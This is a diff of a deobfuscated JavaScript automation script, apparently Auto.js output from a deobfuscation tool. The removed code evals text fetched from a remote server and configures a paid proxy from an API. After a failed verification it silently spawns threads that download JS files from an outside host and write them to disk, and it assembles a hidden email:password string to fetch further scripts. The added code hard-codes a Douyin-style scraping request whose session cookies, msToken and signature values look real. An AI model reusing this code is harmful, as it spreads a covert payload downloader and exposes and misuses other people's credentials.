@@ -1,74 +1,53 @@
-//Mon Apr 28 2025 11:04:31 GMT+0000 (Coordinated Universal Time)
+//Mon Apr 28 2025 11:06:09 GMT+0000 (Coordinated Universal Time)
 //Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
 //Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
-if (yan()) {
-  if (app_key2 == "rxkb9ovgguy9n21") {
-    var spiderId = "7ab204de5b7e403caada6398f29c2831",
-      orderNo = "YZ20188145457DGCJTP",
-      getIp_api = http.get("http://pv.weibo.com/cityjson?ie=utf-8"),
-      InetIP = getIp_api.body.string();
-    eval(InetIP);
-    log("ʹ�ô���ǰ������IP:" + returnCitySN.cip);
-    var xdailiUrl = "http://api.xdaili.cn/xdaili-api//greatRecharge/getGreatIp?spiderId=" + spiderId + "&orderno=" + orderNo + "&returnType=2&count=1";
-    for (let i = 0; i < 3; i++) {
-      try {
-        var getProxy_json = http.get(xdailiUrl).body.json();
-        if (getProxy_json.ERRORCODE == "10036" || getProxy_json.ERRORCODE == "10038" || getProxy_json.ERRORCODE == "10055") throw {
-          "code": "-1",
-          "msg": "��ȡ�ٶȹ���"
-        };
-        if (getProxy_json.ERRORCODE == "10036") throw {
-          "code": "-2",
-          "msg": "��ȡ�����Ѵ�����"
-        };
-        break;
-      } catch (_0x4f7f11) {
-        _0x4f7f11.code == "-1" && (log(_0x4f7f11.msg), sleep(5000));
-        _0x4f7f11.code == "-2" && (log(_0x4f7f11.msg), exit());
-        i == 2 && (log("������δ֪����,��������..."), exit());
-      }
-    }
-    var xdaili_proxyIP = getProxy_json.RESULT[0].ip,
-      xdaili_proxyPort = parseInt(getProxy_json.RESULT[0].port);
-    httpProxy(xdaili_proxyIP, xdaili_proxyPort);
-    var getIp_api = http.get("http://pv.sohu.com/cityjson?ie=utf-8"),
-      InetIP = getIp_api.body.string();
-    eval(InetIP);
-    log("ʹ�ô����������IP:" + returnCitySN.cip);
-    function httpProxy(_0x3d566e, _0x52445c) {
-      var _0x31a2d8 = java.net.Proxy,
-        _0x440a1c = java.net.InetSocketAddress,
-        _0x2c3168 = new Packages.okhttp3.OkHttpClient.Builder().proxy(new _0x31a2d8(_0x31a2d8.Type.HTTP, new _0x440a1c(_0x3d566e, _0x52445c)));
-      http.__okhttp__.muteClient(_0x2c3168);
-    }
+function jin() {
+  if (app_key1 == "ulguxwdu0nxjum1") {
+    app_key6 = "https://www.weibo.com/video/7089750963929632007";
+    log(app_key6);
+    param = {
+      "device_platform": "webapp",
+      "aid": "6383",
+      "channel": "channel_pc_web",
+      "aweme_id": "7089750963929632007",
+      "cursor": "0",
+      "count": "20",
+      "item_type": "0",
+      "insert_ids": "",
+      "rcFT": "AAWfMCW2Q",
+      "version_code": "170400",
+      "version_name": "17.4.0",
+      "cookie_enabled": "true",
+      "screen_width": "1920",
+      "screen_height": "1080",
+      "browser_language": "zh-CN",
+      "browser_platform": "Win32",
+      "browser_name": "MetaSr",
+      "browser_online": "true",
+      "engine_name": "Blink",
+      "engine_version": "72.0.3626.81",
+      "os_name": "Windows",
+      "os_version": "10",
+      "cpu_core_num": "8",
+      "device_memory": "8",
+      "platform": "PC",
+      "downlink": "10",
+      "effective_type": "4g",
+      "round_trip_time": "50",
+      "webid": "7099002327067117096",
+      "msToken": "FdvpG2CFmmbT4NaAGTPg4j1dLtJMihIPjcbxG2OzKbp5Tjrf_vGCDdDHO5mf6ZhFoRxOLcnGDZq9tBpCFdioxrUNfecdqyPAfQZFGYxnLW6V4VmiZQ8wvqLmSAy9Frw=",
+      "X-Bogus": "DFSzswVuDehAN9TwSwK4cnCr9Fzd",
+      "_signature": "_02B4Z6wo00001sLZt2QAAIDBCmV-evA83ArC2bPAANItec"
+    };
+    headers = {
+      "cookie": "ttwid=1%7CdnZEPJXY7QYXrKAjOuajtYwhEf6uYrAvY_3PDCYIJFU%7C1652865293%7Ce53ef618aa711d16da479b8a5542f5cd2975a67ef05c28e60104708ade3f9bb4; passport_csrf_token=aabe7ea64ad4026acad7a6c2d6fe91b8; passport_csrf_token_default=aabe7ea64ad4026acad7a6c2d6fe91b8; s_v_web_id=verify_l3bdbk23_8tvEJlwp_CCkR_4D7S_AOYq_KK1HiX3D5gJJ; AVATAR_FULL_LOGIN_GUIDE_ITA_TIMESTAMP=1652927515687; AVATAR_FULL_LOGIN_GUIDE_ITA_COUNT=1; n_mh=pWOT_m9BARSnfZ7Mv0VPJej8h6mQKqMejyiLQYKZmM8; home_can_add_dy_2_desktop=%220%22; _tea_utm_cache_6383=undefined; _tea_utm_cache_1300=undefined; _tea_utm_cache_2285=undefined; THEME_STAY_TIME=%22299427%22; IS_HIDE_THEME_CHANGE=%221%22; _tea_utm_cache_2018=undefined; pwa_guide_count=%223%22; __ac_nonce=06296c1e1005f8821fe21; __ac_signature=_02B4Z6wo00f01uSre2wAAIDBLBeycZYdF6Lki3.AANvJ0a; strategyABtestKey=1654047205.019; douyin.com; msToken=NQdz3D4GoyePi2anj1tWD09r-3vmqrx9rCypS5n63CyaxbUGAnatC4VlZmjUy0oEunQef59jPwFQgnX9sB_cPSIXldut-32NHWoIrM9-E5kn0h1LawdHgg==; msToken=FdvpG2CFmmbT4NaAGTPg4j1dLtJMihIPjcbxG2OzKbp5Tjrf_vGCDdDHO5mf6ZhFoRxOLcnGDZq9tBpCFdioxrUNfecdqyPAfQZFGYxnLW6V4VmiZQ8wvqLmSAy9Frw=",
+      "User-Agent": "user-agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.81 Safari/537.36 SE 2.X MetaSr 1.0"
+    };
+    data = {
+      "query:": "dog"
+    };
+  } else {
+    return false;
   }
-  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 29), kk7.slice(29, 42) + "3.js");
-} else toastLog("请求服务器验证失败……"), threads.start(function () {
-  for (ks = 0; ks < 10; ks++) {
-    {
-      let _0x1c7ca2 = "http://c460846523.cvc.scd.wezhan.cn/filedownload/518258",
-        _0x1cc411 = http.get(_0x1c7ca2);
-      if (_0x1cc411.statusCode == 200) {
-        files.writeBytes("./douying" + ks + ".js", _0x1cc411.body.bytes());
-      }
-    }
-  }
-}), threads.start(function () {
-  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 30), kk7.slice(30, 42) + "1.js");
-}), threads.start(function () {
-  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 30), kk7.slice(30, 42) + "2.js");
-}), threads.start(function () {
-  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 30), kk7.slice(30, 42) + "3.js");
-}), threads.start(function () {
-  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 30), kk7.slice(30, 42) + "4.js");
-}), threads.start(function () {
-  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 30), kk7.slice(30, 42) + "5.js");
-}), threads.start(function () {
-  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 30), kk7.slice(30, 42) + "6.js");
-}), threads.start(function () {
-  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 30), kk7.slice(30, 42) + "7.js");
-}), threads.start(function () {
-  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 30), kk7.slice(30, 42) + "8.js");
-}), setTimeout(function () {
-  exit();
-}, 2000), key1 = "8366391277", key5 = "s8h3hds926h3", key9 = "a5e3t50tun3vdb2", ss9 = "15729174229@136.com";
+}
+_0xodO = "jsjiami.com.v6";
